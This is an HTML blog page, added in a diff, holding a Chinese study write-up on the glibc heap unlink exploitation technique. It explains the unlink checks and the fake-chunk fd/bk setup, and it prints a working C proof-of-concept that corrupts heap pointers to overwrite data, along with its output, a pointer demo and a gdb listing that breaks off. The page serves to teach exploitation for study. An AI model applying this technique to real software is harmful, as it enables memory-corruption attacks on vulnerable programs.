@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fox.jpg">
+  <link rel="icon" href="/img/fox.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="知世">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="gdb写文章系列hhh  借鉴学习的师傅们的文章在此感谢师傅们的无私分享 1234https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-224836.htmhttps:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-247007.htmhttps:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;unlink-zh&#x2F;https:&#x2F;&#x2F;blog.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink_study">
+<meta property="og:url" content="https://nightrainy.github.io/2019/07/19/unlink-study/index.html">
+<meta property="og:site_name" content="知世の小屋">
+<meta property="og:description" content="gdb写文章系列hhh  借鉴学习的师傅们的文章在此感谢师傅们的无私分享 1234https:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-224836.htmhttps:&#x2F;&#x2F;bbs.pediy.com&#x2F;thread-247007.htmhttps:&#x2F;&#x2F;ctf-wiki.github.io&#x2F;ctf-wiki&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;unlink-zh&#x2F;https:&#x2F;&#x2F;blog.">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-07-19T03:11:19.000Z">
+<meta property="article:modified_time" content="2019-08-01T04:13:36.000Z">
+<meta property="article:author" content="知世">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>unlink_study - 知世の小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nightrainy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>知世</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rick.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="unlink_study"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2019-07-19 11:11" pubdate>
+          2019年7月19日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">unlink_study</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>gdb写文章系列hhh</p>
+</blockquote>
+<h1 id="借鉴学习的师傅们的文章"><a href="#借鉴学习的师傅们的文章" class="headerlink" title="借鉴学习的师傅们的文章"></a>借鉴学习的师傅们的文章</h1><p>在此感谢师傅们的无私分享</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">224836</span>.htm<br>https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">247007</span>.htm<br>https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/g</span>libc-heap<span class="hljs-regexp">/unlink-zh/</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Pwnpanda/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">81369367</span><br></code></pre></td></tr></table></figure>
+<hr>
+<h1 id="0x00-unlink"><a href="#0x00-unlink" class="headerlink" title="0x00 unlink"></a>0x00 unlink</h1><p>前面师傅们的文章已经写的很详尽了,我就不多说了,就先来简要介绍一下unlink好了</p>
+<h2 id="1-unlink的正常目的"><a href="#1-unlink的正常目的" class="headerlink" title="1.unlink的正常目的"></a>1.unlink的正常目的</h2><p><strong>unlink的目的就是为了拿出双向链表中的一个chunk</strong></p>
+<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2.过程"></a>2.过程</h2><p>在老版的unlink中是没有检查的,所作的工作也十分简单,借用下ctf-wiki的解释也就是:</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (FD-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> != P || BK-&gt;</span>fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-function"><span class="hljs-title">if</span> (__builtin_expect (P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd_nextsize</span>-&gt;</span>bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __<span class="hljs-function"><span class="hljs-title">builtin_expect</span> (P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk_nextsize</span>-&gt;</span>fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>                               P, AV);<br></code></pre></td></tr></table></figure>
+<p>unlink的过程也就是<br>设置 P-&gt;fd-&gt;bk &#x3D; P-&gt;bk,P-&gt;bk-&gt;fd &#x3D; P-&gt;fd的过程,也就是我们正常对双向链表删除其中一个之后把其余两个链接起来的过程</p>
+<p>而现在的unlink自然是加了检查:</p>
+<ul>
+<li>检查chunk大小,即检查chunk_size&#x3D;&#x3D;next_chunk-&gt;pre_size ? true:false;</li>
+<li>检查链表指针指向,即检查P-&gt;fd-&gt;bk&#x3D;&#x3D;P&amp;&amp;P-&gt;BK-&gt;fd&#x3D;&#x3D;P ? true:false;</li>
+</ul>
+<hr>
+<h2 id="使用unlink的时机"><a href="#使用unlink的时机" class="headerlink" title="使用unlink的时机"></a>使用unlink的时机</h2><ul>
+<li><p>malloc</p>
+<ol>
+<li>在恰好大小的large chunk处取chunk时</li>
+<li>在比请求大小大的bin中取chunk时</li>
+</ol>
+</li>
+<li><p>Free</p>
+<ol>
+<li>后向合并,合并物理相邻低物理地址空闲chunk时</li>
+<li>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</li>
+</ol>
+</li>
+<li><p>malloc_consolidate</p>
+<ol>
+<li>后向合并,合并物理相邻低地址空闲chunk时。</li>
+<li>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）</li>
+</ol>
+</li>
+<li><p>realloc</p>
+<pre><code class="hljs">  前向扩展，合并物理相邻高地址空闲 chunk（除了top chunk）。
+</code></pre>
+</li>
+</ul>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>use after free,并且可以修改smallbin或者unsorted bin的fd和kb指针时</li>
+<li>已知位置存在一个指针指向可以UAF的chunk</li>
+</ol>
+<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>可以使得UAF的chunk指向向前第三个chunk..有点乱,就是p-&gt;p-0x18这样子</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li><p>修改 fd 为 p - 0x18</p>
+</li>
+<li><p>修改 bk 为 p - 0x10</p>
+</li>
+<li><p>触发 unlink</p>
+</li>
+<li><p>p 处的指针会变为 p - 0x18。</p>
+</li>
+</ol>
+<h1 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h1><p>我们也借用Heap Exploitation系列的unlink来进行说明,这里我做了一点修改,我输出了chunk2的地址,并且做了一些输出说明</p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先看代码</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> &#123;<br>  <span class="hljs-type">size_t</span> prev_size;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fd;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *bk;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>];               <span class="hljs-comment">// padding</span><br>&#125;;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *chunk1, *chunk2;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fake_chunk, *chunk2_hdr;<br>  <span class="hljs-type">char</span> data[<span class="hljs-number">20</span>];<br> <br>  <span class="hljs-comment">// First grab two chunks (non fast)</span><br>  chunk1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>  chunk2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1_addr : %p\n&quot;</span>, &amp;chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk2_addr : %p\n&quot;</span>,&amp;chunk2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] chunk1 : %p\n&quot;</span>, chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk2 : %p\n&quot;</span>, chunk2);<br> <br>  <span class="hljs-comment">// Assuming attacker has control over chunk1&#x27;s contents</span><br>  <span class="hljs-comment">// Overflow the heap, override chunk2&#x27;s header</span><br> <br>  <span class="hljs-comment">// First forge a fake chunk starting at chunk1</span><br>  <span class="hljs-comment">// Need to setup fd and bk pointers to pass the unlink security check</span><br>  fake_chunk = (<span class="hljs-keyword">struct</span> chunk_structure *)chunk1;<br>  fake_chunk-&gt;fd = (<span class="hljs-keyword">struct</span> chunk_structure *)(&amp;chunk1 - <span class="hljs-number">3</span>); <span class="hljs-comment">// Ensures P-&gt;fd-&gt;bk == P</span><br>  fake_chunk-&gt;bk = (<span class="hljs-keyword">struct</span> chunk_structure *)(&amp;chunk1 - <span class="hljs-number">2</span>); <span class="hljs-comment">// Ensures P-&gt;bk-&gt;fd == P</span><br> <br>  <span class="hljs-comment">// Next modify the header of chunk2 to pass all security checks</span><br>  chunk2_hdr = (<span class="hljs-keyword">struct</span> chunk_structure *)(chunk2 - <span class="hljs-number">2</span>);<br>  chunk2_hdr-&gt;prev_size = <span class="hljs-number">0x80</span>;  <span class="hljs-comment">// chunk1&#x27;s data region size</span><br>  chunk2_hdr-&gt;size &amp;= ~<span class="hljs-number">1</span>;        <span class="hljs-comment">// Unsetting prev_in_use bit</span><br> <br>  <span class="hljs-comment">// Now, when chunk2 is freed, attacker&#x27;s fake chunk is &#x27;unlinked&#x27;</span><br>  <span class="hljs-comment">// This results in chunk1 pointer pointing to chunk1 - 3</span><br>  <span class="hljs-comment">// i.e. chunk1[3] now contains chunk1 itself.</span><br>  <span class="hljs-comment">// We then make chunk1 point to some victim&#x27;s data</span><br>  <span class="hljs-built_in">free</span>(chunk2);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1 :%p\n&quot;</span>, chunk1);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]chunk1[3] : %x\n&quot;</span>, chunk1[<span class="hljs-number">3</span>]);<br> <br>  chunk1[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>)data;<br> <br>  <span class="hljs-built_in">strcpy</span>(data, <span class="hljs-string">&quot;Victim&#x27;s data&quot;</span>);<br> <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,data);<br>  <span class="hljs-comment">// Overwrite victim&#x27;s data using chunk1</span><br>  chunk1[<span class="hljs-number">0</span>] = <span class="hljs-number">0x002164656b636168LL</span>;<br> <br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, data);<br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><p>我们先运行一下程序看看程序的输出:</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[*]</span>chunk1_addr : 0x7fffa0b55ff0<br><span class="hljs-comment">[*]</span>chunk2_addr : 0x7fffa0b55ff8<br><span class="hljs-comment">[*]</span>chunk1 : 0xb3a010<br><span class="hljs-comment">[*]</span>chunk2 : 0xb3a0a0<br><span class="hljs-comment">[*]</span>chunk1 :0x7fffa0b55fd8<br><span class="hljs-comment">[*]</span>chunk1<span class="hljs-comment">[3]</span> : a0b55fd8<br>hacked!<br><br></code></pre></td></tr></table></figure>
+<h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>代码逻辑很简单,程序先是创建了一个模拟<code>free chunk</code>的结构体,然后创建了两个<code>unsigned long long</code> 的chunk,分配了两个0x80的内存.<br>之后进行了三次输出,分别输出了chunk1的地址和chunk1,chunk2的内容<br>随后进行了类型强转,这时我们就有了一个模拟<code>free chunk</code>的fake chunk,并且chunk1我们还可以进行利用,意味着我们有了一个uaf的chunk即chunk1.<br>我们知道,chunk的指针给的是指向mem地址的,因此它后续的一些操作</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl">fake_chunk = (struct chunk_structure *)chunk1;<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span> = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">fd</span>-&gt;</span>bk == P<br><span class="hljs-function"><span class="hljs-title">fake_chunk</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span> = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd == P<br></code></pre></td></tr></table></figure>
+<h2 id="小实例"><a href="#小实例" class="headerlink" title="小实例"></a>小实例</h2><p>在这里便于理解我写了一个小的demo来解释一些指针的加减,代码如下:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> *chunk1,*chunk2;<br>        chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>        chunk1=<span class="hljs-number">100</span>;<br>        chunk2=<span class="hljs-number">200</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk2);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,chunk1<span class="hljs-number">-1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-3</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-2</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,&amp;chunk1<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们编译运行一下:</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;╰─<span class="hljs-meta"># ./test</span><br><span class="hljs-number">0x7ffdd51db3f8</span><br><span class="hljs-number">0x64</span><br><span class="hljs-number">0x7ffdd51db400</span><br><span class="hljs-number">0xc8</span><br><span class="hljs-number">0x4c</span><br><span class="hljs-number">0x54</span><br><span class="hljs-number">0x5c</span><br><span class="hljs-number">0x7ffdd51db3e0</span> <span class="hljs-comment">//chunk1-3</span><br><span class="hljs-number">0x7ffdd51db3e8</span> <span class="hljs-comment">//chunk1-2</span><br><span class="hljs-number">0x7ffdd51db3f0</span> <span class="hljs-comment">//chunk1-1</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到每次指针在做减法运算时地址其实每次减8,即</p>
+<p><strong>&amp;str -1&#x3D;str_addr - 8</strong></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这时我们再来看看结构体</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> &#123;<br>  <span class="hljs-type">size_t</span> prev_size;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *fd;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">chunk_structure</span> *bk;   <br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">10</span>];               <span class="hljs-comment">// padding</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>我们知道正常chunk的指针是指向mem的,因此我们的chunk_structure就是指向mem的也就是chunk1的地址,我们调试一下.</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-number">0x00000000004006cc</span> &lt;+<span class="hljs-number">102</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>,<span class="hljs-number">0x40089e</span><br>   <span class="hljs-number">0x00000000004006d1</span> &lt;+<span class="hljs-number">107</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x00000000004006d6</span> &lt;+<span class="hljs-number">112</span>&gt;:   <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400530</span> &lt;printf@plt&gt;<br>   <span class="hljs-number">0x00000000004006db</span> &lt;+<span class="hljs-number">117</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x38</span>]<br>   <span class="hljs-number">0x00000000004006df</span> &lt;+<span class="hljs-number">121</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br>   <span 